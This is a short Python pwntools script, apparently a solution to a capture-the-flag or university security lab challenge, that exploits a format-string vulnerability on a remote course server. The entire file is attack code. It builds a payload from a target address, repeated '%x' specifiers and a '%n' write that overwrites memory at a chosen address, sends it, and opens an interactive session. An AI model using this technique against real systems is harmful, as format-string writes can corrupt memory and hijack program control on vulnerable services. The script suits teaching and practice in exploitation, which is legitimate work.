from pwn import *

# P = process("./bin")
P = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10054)
target = 0x804a044
value = 0xff000000
target += 3
payload = p32(target) + b"%x08."*5 + b"%08x%n"

P.sendline(payload)
P.interactive()
